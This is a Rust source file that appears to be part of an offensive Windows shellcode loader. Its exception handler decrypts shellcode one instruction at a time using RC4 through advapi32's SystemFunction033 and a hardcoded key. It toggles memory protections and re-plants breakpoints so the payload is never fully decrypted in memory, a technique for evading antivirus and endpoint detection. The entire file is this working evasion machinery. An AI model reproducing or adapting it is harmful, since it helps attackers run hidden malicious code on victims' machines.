use crate::INFO;
use std::ffi::{c_long, c_uchar, c_ulong, c_ushort, c_void};
use std::mem::{size_of, transmute, zeroed};
use std::ops::Not;
use std::ptr::{addr_of_mut, null, null_mut};
use windows_sys::Win32::Foundation::{
    EXCEPTION_BREAKPOINT, NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    CONTEXT, EXCEPTION_POINTERS, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualProtect, VirtualQuery, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::Threading::ExitThread;

const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;

enum InstrInfo {
    Quota,
    Rva,
    Number,
}

#[repr(C)]
struct UString {
    length: c_ulong,
    maximum_length: c_ulong,
    buffer: *mut c_void,
}

fn check_allocation_protection(allocation: *mut c_void, allocation_size: usize) -> c_ulong {
    unsafe {
        let mut p_mem_info: MEMORY_BASIC_INFORMATION = zeroed();
        if VirtualQuery(allocation, addr_of_mut!(p_mem_info), allocation_size) != 0 {
            return p_mem_info.Protect;
        }
    }

    0
}

fn resolve_buffer_feature(pointer: *mut c_void, dw_option: InstrInfo) -> usize {
    unsafe {
        let offset = (pointer as usize) - (INFO.allocation_base as usize);

        for i in 0..=INFO.instruction.len() {
            if offset == INFO.instruction[i].rva {
                return match dw_option {
                    InstrInfo::Quota => INFO.instruction[i].quota,
                    InstrInfo::Rva => INFO.instruction[i].rva,
                    InstrInfo::Number => i,
                };
            }
        }
    }

    0
}

pub fn resolve_end_of_text_segment() -> *mut c_void {
    unsafe {
        let h_current = GetModuleHandleA(null());
        if h_current != 0 {
            let p_idh = h_current as *mut IMAGE_DOS_HEADER;
            let p_inh =
                ((h_current as usize) + ((*p_idh).e_lfanew as usize)) as *mut IMAGE_NT_HEADERS64;
            let p_ish =
                ((p_inh as usize) + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;
            let p_text = ((h_current as usize) + ((*p_ish).VirtualAddress as usize)) as *mut c_void;
            let p_text_null =
                ((p_text as usize) + ((*p_ish).Misc.VirtualSize as usize) + 5) as *mut c_void;

            return p_text_null;
        }
    }

    null_mut()
}

fn resolve_instruction_by_rva(pointer: *mut c_void) -> NTSTATUS {
    unsafe {
        let rva = resolve_buffer_feature(pointer, InstrInfo::Rva);
        for i in 0..INFO.instruction[resolve_buffer_feature(pointer, InstrInfo::Number)].quota {
            *(((pointer as usize) + i) as *mut c_uchar) = INFO.sh.get(rva + i).unwrap().to_owned();
        }
    }

    STATUS_SUCCESS
}

fn patch_shellcode_for_exception(pointer: *mut c_void) -> NTSTATUS {
    let mut status = STATUS_UNSUCCESSFUL;

    unsafe {
        let mut adv_base = GetModuleHandleA(b"advapi32.dll\0".as_ptr().cast());
        if adv_base == 0 {
            adv_base = LoadLibraryA(b"advapi32.dll\0".as_ptr().cast());
        }

        if adv_base != 0 {
            let mut k = [
                0x62_u8, 0x31_u8, 0x6e_u8, 0x68_u8, 0x61_u8, 0x63_u8, 0x6b_u8,
            ];
            let mut buf: UString = zeroed();
            let mut key: UString = zeroed();
            buf.buffer = pointer;
            buf.length =
                c_ulong::try_from(resolve_buffer_feature(pointer, InstrInfo::Quota)).unwrap();
            key.buffer = k.as_mut_ptr().cast();
            key.length = 7;

            let system_function033: fn(data: *mut UString, k_needed: *mut UString) -> NTSTATUS =
                transmute(GetProcAddress(
                    adv_base,
                    b"SystemFunction033\0".as_ptr().cast(),
                ));
            if (system_function033 as usize) != 0 {
                status = system_function033(addr_of_mut!(buf), addr_of_mut!(key));
            }
        }
    }

    status
}

fn adjust_function_parameters(context_record: *mut CONTEXT) -> bool {
    let mut status = false;

    unsafe {
        if (*context_record).Rcx as usize >= INFO.allocation_base as usize
            && (*context_record).Rcx as usize <= INFO.allocation_base as usize + INFO.sh.len()
            && *(((*context_record).Rcx) as *mut c_uchar) == 0xcc
        {
            let mut current_instruction =
                resolve_buffer_feature((*context_record).Rcx as *mut c_void, InstrInfo::Number);
            let mut pointer = (*context_record).Rcx as *mut c_void;

            while status.not() {
                resolve_instruction_by_rva(pointer);
                patch_shellcode_for_exception(pointer);
                for i in 0..INFO.instruction[current_instruction].quota {
                    if *(((pointer as usize) + i) as *mut c_uchar) == 0x00 {
                        status = true;
                        break;
                    }
                }

                pointer = ((pointer as usize) + INFO.instruction[current_instruction].quota)
                    as *mut c_void;
                current_instruction += 1;
            }
        }
    }

    status
}

fn restore_previous_instruction_breakpoint(pointer: *mut c_void) -> bool {
    unsafe {
        let current_instruction = resolve_buffer_feature(pointer, InstrInfo::Number);
        for i in 0..INFO.instruction[current_instruction].quota {
            *(((pointer as usize) + i) as *mut c_uchar) = 0xcc;
        }
    }

    true
}

pub unsafe extern "system" fn intercept_shellcode_exception(
    exception_data: *mut EXCEPTION_POINTERS,
) -> c_long {
    unsafe {
        if (((*(*exception_data).ContextRecord).Rip as usize) >= (INFO.allocation_base as usize)
            && ((*(*exception_data).ContextRecord).Rip as usize)
                <= ((INFO.allocation_base as usize) + INFO.sh.len()))
            || (*(*exception_data).ContextRecord).Rip == (resolve_end_of_text_segment() as u64)
        {
            if (*(*exception_data).ContextRecord).Rip == (resolve_end_of_text_segment() as u64) {
                (*(*exception_data).ContextRecord).Rip = INFO.allocation_base as u64;
            }

            let mut old = 0;
            if check_allocation_protection(
                ((*(*exception_data).ContextRecord).Rip) as *mut c_void,
                INFO.sh.len(),
            ) == PAGE_EXECUTE_READ
            {
                VirtualProtect(
                    ((*(*exception_data).ContextRecord).Rip) as *mut c_void,
                    INFO.sh.len(),
                    PAGE_READWRITE,
                    addr_of_mut!(old),
                );
            }

            if INFO.previous_instruction >= INFO.allocation_base {
                restore_previous_instruction_breakpoint(INFO.previous_instruction);
            }

            if (*(*exception_data).ExceptionRecord).ExceptionCode == EXCEPTION_BREAKPOINT
                || (*(*exception_data).ContextRecord).Rip == INFO.allocation_base as u64
            {
                resolve_instruction_by_rva((*(*exception_data).ContextRecord).Rip as *mut c_void);
                if patch_shellcode_for_exception(
                    (*(*exception_data).ContextRecord).Rip as *mut c_void,
                ) == STATUS_UNSUCCESSFUL
                {
                    ExitThread(0);
                }

                INFO.previous_instruction = ((*(*exception_data).ContextRecord).Rip) as *mut c_void;

                if *(((*(*exception_data).ContextRecord).Rip) as *mut c_ushort) == 0xe0ff {
                    *(((*(*exception_data).ContextRecord).Rip) as *mut c_ushort) = 0xcccc;
                    adjust_function_parameters((*exception_data).ContextRecord);
                    (*(*exception_data).ContextRecord).Rip = (*(*exception_data).ContextRecord).Rax;
                    restore_previous_instruction_breakpoint(INFO.previous_instruction);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }

            VirtualProtect(
                ((*(*exception_data).ContextRecord).Rip) as *mut c_void,
                INFO.sh.len(),
                PAGE_EXECUTE_READ,
                addr_of_mut!(old),
            );
            EXCEPTION_CONTINUE_EXECUTION
        } else {
            ExitThread(0);
        }
    }
}
